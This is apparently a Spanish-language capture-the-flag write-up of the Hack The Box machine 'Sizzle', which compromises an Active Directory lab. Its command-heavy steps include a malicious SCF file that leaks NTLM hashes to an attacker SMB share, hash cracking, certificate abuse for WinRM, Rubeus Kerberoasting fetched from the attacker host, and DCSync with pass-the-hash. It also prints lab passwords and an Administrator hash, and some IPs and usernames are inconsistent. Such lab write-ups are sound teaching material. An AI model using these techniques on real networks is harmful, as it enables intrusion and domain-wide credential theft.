---
layout: post
title: HTB_Sizzle
date: 2023/07/10
slug: HTB_Sizzle
heroImage: /assets/machines.jpg
---

# Sizzle {-}

## Introduccion {-}

La maquina del dia se llama Sizzle.

El replay del live se puede ver aqui

[![S4vitaar Sizzle maquina](https://img.youtube.com/vi/nyxEzS55-Aw/0.jpg)](https://www.youtube.com/watch?v=nyxEzS55-Aw)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.103
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.103
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.103 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p21,53,80,135,139,389,443,445,464,593,636,3268,3269,5985,5986,9389,47001,49664,49665,49666,49667,49668,49677,49688,49689,49691,49694,49706,49712,49720 10.10.10.103 -oN targeted
```


| Puerto | Servicio   | Que se nos occure?                          | Que falta?     |
| ------ | ---------- | ------------------------------------------- | -------------- |
| 21     | ftp        | Anonymous connection                        |                |
| 53     | domain     | Domain Controller ataque transferencia zona | dominio valido |
| 80     | http       | web Fuzzin                                  |                |
| 135    | msrpc      |                                             |                |
| 139    | netbios    |                                             |                |
| 389    | LDAP       | Bloodhound ldapdomaindump                   | credenciales   |
| 443    | https      | web Fuzzin                                  |                |
| 445    | smb        | Null session                                |                |
| 464    | kpasswd5?  |                                             |                |
| 593    | ncacn_http |                                             |                |
| 636    | tcpwrapped |                                             |                |
| 3268   | ldap       |                                             |                |
| 3269   | tcpwrapped |                                             |                |
| 5985   | WinRM      | evil-winrm                                  | credenciales   |
| 5986   | WinRM ssl  | evil-winrm                                  | credenciales   |
| 9389   | mc-nmf     | Puertos por defecto de windows              |                |
| 47001  | http       | Puertos por defecto de windows              |                |
| 49664  | msrpc      | Puertos por defecto de windows              |                |
| 49665  | msrpc      | Puertos por defecto de windows              |                |
| 49666  | msrpc      | Puertos por defecto de windows              |                |
| 49668  | msrpc      | Puertos por defecto de windows              |                |
| 49677  | msrpc      | Puertos por defecto de windows              |                |
| 49688  | ncacn_http | Puertos por defecto de windows              |                |
| 49689  | msrpc      | Puertos por defecto de windows              |                |
| 49691  | msrpc      | Puertos por defecto de windows              |                |
| 49694  | msrpc      | Puertos por defecto de windows              |                |
| 49706  | msrpc      | Puertos por defecto de windows              |                |
| 49712  | msrpc      | Puertos por defecto de windows              |                |
| 49720  | msrpc      | Puertos por defecto de windows              |                |


### Analyzando el FTP {-}

```bash
ftp 10.10.10.103
Name: anonymous
Password: #Enter
#Output
User logged in.
dir
ls -la
```

Hemos podido loggearnos como el usuario **anonymous** pero no vemos nada. Miramos si podemos subir archivos.

```bash
echo "content" > prueba.txt

ftp 10.10.10.103
Name: anonymous
Password: #Enter
#Output
User logged in.

put prueba.txt
#Output
550 Access is denied.
```

No podemos subir archivos.

### Analysis del certificado ssl {-}

```bash
openssl s_client -connect 10.10.10.103:443
```

Aqui vemos el dominio 
```bash
 sizzle.htb.local 
```
 y lo metemos en el 
```bash
 /etc/hosts 
```


### Analysis del dominio {-}

```bash
dig @10.10.10.103 sizzle.htb.local ns
```

Encontramos otro dominio, el 
```bash
 hostmaster.htb.local 
```
 que añadimos en el 
```bash
 /etc/hosts 
```
. Miramos si es vulnerable a ataque de transferencia de zona.

```bash
dig @10.10.10.103 sizzle.htb.local axfr
```

Aqui vemos que no applica.

### Analysis del RPC {-}

```bash
rpcclient -U "" 10.10.10.103 -N

rpcclient $> enumdomusers
#Output
NT_STATUS_ACCESS_DENIED
```

Aqui vemos que hemos podido connectar con el NULL Session pero no tenemos derecho de enumerar usuarios a nivel de dominio.

### Analyzando el SMB {-}

```bash
crackmapexec smb 10.10.10.103
smbmap -H 10.10.10.103 -u 'null'
```

Vemos que estamos en frente de una maquina Windows 10 de 64 bit pro que se llama **SIZZLE** en el dominio **htb.local**.
Vemos que hay recursos compartidos a nivel de red con los recursos 
```bash
 IPC$ 
```
 y 
```bash
 Department Shares 
```
 con derechos de lectura.
Seguimos analyzando con **smbclient**

```bash
smbclient "//10.10.10.103/Department Shares" 10.10.10.103 -N
smb: \>

dir
```

Aqui vemos muchos directorios y es bastante dificil ver todo lo que hay desde smbclient. Nos creamos una montura para visualizar este recurso.

```bash
mkdir /mnt/smb
mount -t cifs "//10.10.10.103/Department Shares" /mnt/smb
cd /mnt/smb
tree
cd Users
```
## Vulnerability Assessment {-}

### Recurso READ ONLY escribible {-}

Algo interesante con smb es que los derechos que vemos desde la montura no son los derechos reales del recurso compartido. Podemos usar de **smbcacls** para
controlar los derechos reales del directorio compartido.

```bash
smbcacls "//10.10.10.103/Department Shares" Users/amanda -N
``` 

Aqui vemos el derecho real de este directorio:


![Sizzle-smbcacls-real-rihts](/assets/images/Sizzle-smbcacls-real-rights.png) 
Como tenemos una montura podemos crear un script que nos permite enumerar los directorios para saber si hay un directorio con derechos de escritura.

```bash
cd /mnt/smb/Users
ls -l | awk 'NF{print $NF}' | while read directory; do echo -e "\n[+] Directory $directory; smbcacls "//10.10.10.10/Department Shares" Users/$directory -N | grep -i everyone ; done
```

Vemos que se puede escribir en el directorio Public. Creamos un fichero malicioso en este directorio.


### SCF fichero malicioso para smb {-}

Buscando por internet con las palabras 
```bash
 smb malicious file 
```
, encontramos una possiblidad de injectar un fichero malicioso de typo SCF. Esta vulnerabilidad
consiste injectar una peticion a la maquina de atacante a partir del momento que alguien vea el icono del fichero creado.

1. Creamos un recurso compartido a nivel de red

    ```bash
    cd content
    impacket-smbserver smbFolder $(pwd) -smb2support
    ```

1. Creamos el ficher scf malicioso en el directorio **Public**

    ```bash
    cd /mnt/smb/Users/Public
    nano file.scf

    [Shell]
    Command=2
    IconFile=\\10.10.16.3\smbFolder\pentestlab.ico
    [Taskbar]
    Command=ToggleDesktop
    ```

1. Esperamos un momentito

Ya vemos que una conexion se a establecida y vemos un hash NTLM de version 2 para el usuario amanda.

### Crackeamos el hash con john {-}

Copiamos el hash en un fichero y intentamos crackearlo con John

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt amanda_hash
```

ya tenemos una credencial para el usuario amanda.

Checkeamos la validez de esta credencial con **crackmapexec**

```bash
crackmapexec smb 10.10.10.103 -u 'amanda' -p 'Ashare1972'
```

Vemos que es valida pero no nos podemos conectar porque ne esta el famoso **Pwn3d**

### Enumeracion de usuarios con rpcclient {-}

```bash
rpcclient -U "amanda%Ashare1972" 10.10.10.10 -c 'enumdomusers'
rpcclient -U "amanda%Ashare1972" 10.10.10.10 -c 'enumdomgroups'
# get the rid of domain admins -> 0x200 in this example
rpcclient -U "amanda%Ashare1972" 10.10.10.10 -c 'querygroupmem 0x200'
# get the rid of the users -> 0x1f4 for example
rpcclient -U "amanda%Ashare1972" 10.10.10.10 -c 'queryuser 0x1f4'
```

Nos creamos una lista de usuario desde rpcclient

```bash
cd content
rpcclient -U "amanda%Ashare1972" 10.10.10.161 -N -c "enumdomusers" 
rpcclient -U "amanda%Ashare1972" 10.10.10.161 -N -c "enumdomusers" | grep -oP '\[.*?\]' 
rpcclient -U "amanda%Ashare1972" 10.10.10.161 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep "0x" -v 
rpcclient -U "amanda%Ashare1972" 10.10.10.161 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep "0x" -v | tr -d '[]'
rpcclient -U "amanda%Ashare1972" 10.10.10.161 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep "0x" -v | tr -d '[]' > users.txt
```

Como tenemos un listado de usuarios, lanzamos un ataque ASPRoasting para ver si encontramos el TGT de otro usuario.

### Asproasting attack {-}

```bash
GetNPUsers.py htb.local/amanda:Ashare1972 -no-pass -usersfile users
```

Aqui vemos que el ataque no aranca y es normal. Si miramos el contenido del fichero targeted de **nmap** vemos que el puerto 88 de Kerberos no
esta abierto y esto no nos permite ejecutar un ASPRoasting o un Kerberosting attack.


### LDAP domain dump {-}

Intentamos recuperar informaciones desde el ldap.

```bash
cd /var/www/html
ldapdomaindump -u "htb.local\amanda" -p Ashare1972 10.10.10.103 
```

Hemos podido dumpear las informaciones del ldap en ficheros web.

```bash
service apache2 start
```

y analizamos las informaciones desde firefox en la url 
```bash
 http://localhost 
```
.

Las informaciones interesantes aqui son el echo que el usuario mrlky es kerberoasteable, y que el usuario amanda puede conectarse por WinRM.

Continuamos la enumeracion ldap con **bloodhound-python**


### Bloodhound desde la maquina de atacante {-}

**Bloodhound-python** permite recuperar la informacion del ldap desde la maquina de atacante

```bash
pip install bloodhound
bloodhound-python -d htb.local -u amanda -p Ashare1972 -gc sizzle.htb.local -c all -ns 10.10.10.103
```

Ahora que tenemos los ficheros 
```bash
 .json 
```
 creamos un zip para entrarlo en el bloodhound

```bash
ls -la *.json
zip htblocal.zip *.json
```

Ya lo podemos analizar desde bloodhound

```bash
sudo apt install neo4j bloodhound
sudo neo4j console
```

A partir de aqui, lanzamos desde una nueva terminal el bloodhound

```bash
bloodhound --no-sandbox &> /dev/null &
disown
```

Aqui ya nos podemos connectar a la base de datos neo4j y podemos *drag & drop* el zip y desde el menu Analysis miramos.


- Find all Domains Admins -> Miramos los administradores del dominio
- Find Shortest Paths to Domain Admins -> Via mas rapida de convertirnos en Administrador
- List all Kerberoastable Accounts -> Usuarios kerberoasteables (need of credentials)
- Find Principals with DCSync Right -> Atacantes pueden lanzar un secretsdump attack para recojer todos los hashes de usuarios cuando tiene el privilegio GetChangesAll.


Aqui vemos que los usuarios MRKLY y KRBTGT son kerberoasteable, tambien vemos que el usuario MRKLY tiene privilegios DSYNC con el GetChangesAll.
Aqui ya podemos ver por dondo van los tiros y que tendremos a un momento dado convertirnos en el usuario **MRKLY**. Pero para esto necesitamos primero
conectarnos a la maquina victima, y como podemos conectar con winrm con el usuario amanda intentamos connectarnos.

```bash
crackmapexec winrm 10.10.10.103 -u 'amanda' -p 'Ashare1972'
evil-winrm -i 10.10.10.103 -u 'amanda' -p 'Ashare1972'
```

Aqui vemos que no tiene el Pwn3d! y que no podemos connectarnos. Como sabemos que este usuario se puede conectar miramos otra vez el fichero targeted y vemos que existe el 
puerto **5986** que es un **winrm con SSL** pero para esto necessitamos un certificado SSL. esto se suele encontrar en un directorio de la web.

Fuzzeamos la web.

### Fuzzeando la web con WFUZZ {-}

Como sabemos que el servicio web es un IIS, utilizamos un diccionario de SecList

```bash
cd /usr/share/seclists
find \-name \*IIS\*

wfuzz -c -t 200 --hc=404 -w /usr/share/seclists/Discovery/web-Content/IIS.fuzz.txt http://10.10.10.103/FUZZ
```

Aqui vemos un directorio 
```bash
 /certsrv 
```
. Si entramos con firefox, hay un panel de inicio de session y si le ponemos las credenciales de amanda, podemos entrar.

Vemos un **Microsoft Active Directory Certificate Services**. Es un servicio que nos permite crear certificados para un usuario.

1. En la web le damos a 
```bash
 Request Certificate -> advanced certificate request 
```
, vemos que tenemos que enviar un certificado base64-encoded CMC o PKCS
1. Creamos un certificado (Private Key) en la maquina de atacante

    ```bash
    openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
    cat amanda.csr | tr -d '\n' | xclip -sel clip
    ```

1. Colamos el contenido en la web y podemos descargar el DER encode certificate.


## Vuln exploit & Gaining Access {-}

### Ganando accesso con Win-RM SSL {-}


```bash
mv /home/s4vitar/Downloads/certnew.cer .
evil-winrm -S -c certnew.cer -k amanda.key -i 10.10.10.103 -u 'amanda' -p 'Ashare1972'
```

ya estamos a dentro de la maquina pero no podemos ver la flag. Como previsto aqui vamos a tener que convertirnos al usuar **MRKLY**.


### Kerberoasting attack con Rubeus {-}

1. Descargamos el rubeus.exe

    ```bash
    wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
    python -m http.server 80
    ```

1. Lo descargamos desde la maquina victima

    ```powershell
    cd C:\Windows\Temp
    mkdir BH
    cd BH
    iwr -uri http://10.10.16.3/Rubeus.exe -Outfile Rubeus.exe
    ```

1. Lanzamos el binario

    ```powershell
    C:\Windows\Temp\BH\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972
    ```

Ya podemos ver el hash NTLM de version 2 del usuario **MRKLY**

### Crackeando el hash con John {-}

Copiamos el hash en un fichero y le lanzamos John

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt mrkly_hash
```

Aqui ya tenemos la contraseña del usuario. Aqui no vamos a poder connectarnos a la maquina victima con este usuario porque
tenemos que crear un nuevo certificado.

Entramos con firefox a la routa 
```bash
 /certsrv 
```
 con las credenciales del usuario MRKLY.

1. En la web le damos a 
```bash
 Request Certificate -> advanced certificate request 
```

1. Creamos un certificado (Private Key) en la maquina de atacante

    ```bash
    openssl req -newkey rsa:2048 -nodes -keyout mrkly.key -out mrkly.csr
    cat mrkly.csr | tr -d '\n' | xclip -sel clip
    ```

1. Colamos el contenido en la web y podemos descargar el DER encode certificate.

```bash
    mv /home/s4vitar/Downloads/certnew.cer .
    evil-winrm -S -c certnew.cer -k mrkly.key -i 10.10.10.103 -u 'mrkly' -p 'Football#7'
```

Ya podemos leer la Flag.
## Privilege Escalation {-}

### Rootear la maquina {-}

Como hemos echo una buena enumeracion del systema, sabemos que el usuario **MRKLY** puede hacer un ataque DCSync para recuperar los
hashes de los usuarios del systema.

Aqui la escala de privilegio es facil y se hace desde la maquina de atacante con **SecretsDump**

```bash
impacket-secretsdump htb.local/mrlky:Football#7@10.10.10.103
```

Aqui ya vemos hashes que podemos uzar para hacer **PASS THE HASH**. Copiamos el hash del usuario Administrator y lanzamos

```bash
impacket-wmiexec htb.local/Administrator@10.10.10.103 -hashes :f6b7160bfc91823792e0ac3a162c9267
whoami
#Output
htb\administrator
```

Ya podemos leer el **root.txt**